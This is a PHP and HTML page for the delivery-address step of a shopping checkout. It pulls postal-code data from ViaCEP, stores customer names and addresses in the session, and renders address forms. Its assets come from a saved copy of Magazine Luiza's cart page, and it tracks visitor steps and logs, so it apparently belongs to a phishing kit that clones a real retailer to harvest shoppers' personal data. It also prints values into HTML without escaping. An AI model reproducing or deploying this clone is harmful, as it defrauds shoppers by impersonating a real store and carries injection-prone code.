...
if (isset($_SESSION ['enderecos_all'])) {
	
	
if (isset($_GET ['setAddress'])) {
	
	$id_end = preg_replace( '/[^0-9]/', '', $_GET ['setAddress'] );

	$array_function = $_SESSION ['array_function'];
	
	$qtd_end = $array_function[1] - 1;
	
	if ($id_end <= $qtd_end) {
		
	$endereco_p = $array_function[2][$id_end];
	$data_end = json_decode($endereco_p);

	$rua_end = strtolower($data_end->address);
	$cep_end = strtolower($data_end->zipCode);
	$numero_end = strtolower($data_end->number);
	$complemento_end = strtolower($data_end->complement);
	$bairro_end = strtolower($data_end->village);
	$cidade_end = strtolower($data_end->city);
	$estado_end = $data_end->state;
	$nome_cliente = strtolower($data_end->name);
	
	$_SESSION ['rua_cliente'] = ucwords ($rua_end);
	$_SESSION ['cep_cliente'] = ucwords ($cep_end);
	$_SESSION ['numero_cliente'] = ucwords ($numero_end);
	$_SESSION ['complemento_cliente'] = ucwords ($complemento_end);
	$_SESSION ['bairro_cliente'] = ucwords ($bairro_end);
	$_SESSION ['cidade_cliente'] = ucwords ($cidade_end);
	$_SESSION ['estado_cliente'] = $estado_end;
	$_SESSION ['destinatario_cliente'] = ucwords ($nome_cliente);
	
	$_SESSION ['passo3'] = 1;
	
	$_SESSION ['nome_etapa'] = ucwords($nome_cliente);
...
$cep = $_SESSION ['cep_cliente'];
$nome = $_SESSION ['nome_cliente'];


function cep ($cep) {
	
$link_cep_a = "https://viacep.com.br/ws/".$cep."/json/" ;
$link_cep = file_get_contents($link_cep_a);

$var1 = explode('"localidade": "',$link_cep);
$cidade = explode('",',$var1[1]);

$var2 = explode('"bairro": "',$link_cep);
$bairro = explode('",',$var2[1]);

$var3 = explode('"uf": "',$link_cep);
$estado = explode('",',$var3[1]);

$var4 = explode('"logradouro": "',$link_cep);
$rua = explode('",',$var4[1]);

return '{"cidade": "'.$cidade[0].'", "bairro": "'.$bairro[0].'", "estado": "'.$estado[0].'", "rua": "'.$rua[0].'"}';
...
$json_cep = json_decode(cep($cep));


$cidade = $json_cep->cidade;
$bairro = $json_cep->bairro;
$estado = $json_cep->estado;
$rua = $json_cep->rua;



if ($_SESSION ['enderecos_all'] == 1) {
...
$_SESSION ['new_log'] = 'Endereço';

$_SESSION ['origem'] = 'endereco.php';
...
<html lang="pt-BR">
   ...
   <head>
      ...
      <link rel="stylesheet" onclick="return false" href="./Sacola de compras - Magazine Luiza_files/styles.79c4613d0b8afa883613.css">
...
var i = setInterval(function () {
    ...
    document.getElementById("conteudo").style.display = "inline";
	  ...
	  <div id="conteudo" style="display: none">
                  ...
                  <div class="SignupPage-title">Endereço de entrega</div>

                  <div class="SignupForm">
  
                   

					<?php if ($_SESSION ['enderecos_all'] == 1) { ?>
...
<?php $in = 1; while ($in <= $qtd_end) { ?>

<?php

	$endereco_p = $array_function[2][$in];
	$data_end = json_decode($endereco_p);
...
<div class="AddressBox">
   <div class="AddressBox-leftContainer">
      <div class="AddressBox-title"><?php echo ucwords ($nome_cliente) ?></div>
      <div class="AddressBox-address"><?php echo ucwords ($rua_end) ?>, <?php echo ucwords ($numero_end) ?> - <?php echo ucwords ($complemento_end) ?> - <?php echo ucwords ($bairro_end) ?> - <?php echo ucwords ($cidade_end) ?>/<?php echo ucwords ($estado_end) ?></div>
      <div class="AddressBox-zipcode">
         <!-- react-text: 115 -->CEP: <!-- /react-text --><!-- react-text: 116 --><?php echo substr_replace($cep_end, '-', 5, 0); ?><!-- /react-text -->
      </div>
   </div>
   <a href="endereco.php?setAddress=<?php echo $in ?>">
   <div class="AddressBox-rightContainer">
   <button type="button" class="AddressBox-continue" >Entregar aqui</button>
   </div>
   </a>
...
<?php $in++; } ?>
            ...
            <div class="FormGroup AddressForm-form-group">
                                 ...
                                 <label class="AddressForm-form-label--large" for="zipcode">Cadastrar novo endereço</label>
                                 <div class="inputWithinGroup">
                                    <input id="cep_val" type="tel" class="inputWithin" placeholder="00000-000" name="zipcode" value="">
									<button type="button" class="buttonWithin" onClick="cep_verify()" >OK</button>
                                    <div class="FormGroup-inputGroup">
									   <p class="FormGroup-errorMessage" id="cep_msg"></p>
                                       <a class="AddressForm-form-zipcode-link--href"  href="http://www.buscacep.correios.com.br/sistemas/buscacep/" target="_blank"> Não sei o CEP</a><!-- react-empty: 671 -->
                                    </div>
                                    <div class="AddressForm-cancel"></div>
                                 </div>
                              </div>
							  ...
							  <button type="button" onClick="verify_new_end(1)" class="continueButton" >Continuar</button>
				  ...
				  <hr class="SignupFormPF-divider-line">
					<?php } else if ($_SESSION ['enderecos_all'] == 2) { ?>
                     ...
                     <div name="signupPF">
                        <form class="SignupFormPF" method="post">
                           ...
                           <div class="AddressForm">
                              <div class="form-title">Confirme seu endereço de entrega</div>
                              <div class="FormGroup AddressForm-form-group">
                                 <label class="AddressForm-form-label--large" for="zipcode">CEP</label>
                                 <div class="inputWithinGroup">
                                    <input type="tel" class="inputWithin" placeholder="00000-000" name="zipcode" value="<?php echo $cep ?>">
									<button class="buttonWithin" data-ga="{&quot;category&quot;: &quot;Endereco&quot;, &quot;action&quot;: &quot;CEP&quot;, &quot;label&quot;: &quot;OK CEP&quot;}">OK</button>
                                    <div class="FormGroup-inputGroup">
                                       <a class="AddressForm-form-zipcode-link--href" onclick="return false" href="http://www.buscacep.correios.com.br/sistemas/buscacep/" target="_blank" data-ga="{&quot;category&quot;: &quot;Endereco&quot;, &quot;action&quot;: &quot;CEP&quot;, &quot;label&quot;: &quot;Não sabe CEP&quot;}"> Não sei o CEP</a><!-- react-empty: 671 -->
                                    </div>
                                    <div class="AddressForm-cancel"></div>
                                 </div>
                              </div>
							  ...
							  <div class="FormGroup">
                                 <div class="FormGroup-inputGroup">
                                    <input  id="destinatario" class="FormGroup-input" placeholder="Nome do Destinatário" name="destinatario" value="<?php echo $nome ?>">
                                 </div>
                                   <p class="FormGroup-errorMessage" id="error_destinatario"></p>
                              </div>
							   ...
							   <div class="FormGroup">
                                 <div class="FormGroup-inputGroup">
                                    <input  id="endereco" class="FormGroup-input" placeholder="Endereço" name="endereco" value="<?php echo $rua ?>">
                                 </div>
                                   <p class="FormGroup-errorMessage" id="error_endereco"></p>
                              </div>	
							  ...
							  <div class="FormGroup">
                                 <div class="FormGroup-inputGroup">
                                    <input  id="bairro" class="FormGroup-input" placeholder="Bairro" name="bairro" value="<?php echo $bairro ?>">
                                 </div>
                                   <p class="FormGroup-errorMessage" id="error_bairro"></p>
                              </div>			
							  ...
							  <div class="FormGroup">
                                 <div class="FormGroup-inputGroup">
                                    <input  id="cidade" class="FormGroup-input" placeholder="Cidade" name="cidade" value="<?php echo $cidade ?>">
                                 </div>
                                   <p class="FormGroup-errorMessage" id="error_cidade"></p>
                              </div>							
							  ...
							  <div class="FormGroup">
                                 <div class="FormGroup-inputGroup">
                                    <input  id="estado" class="FormGroup-input" placeholder="Estado" name="estado" value="<?php echo $estado ?>">
                                 </div>
                                   <p class="FormGroup-errorMessage" id="error_estado"></p>
                              </div>					
                           ...
                           <button class="continueButton" disabled="">Continuar</button>
                        </form>
                     </div>
                  </div>
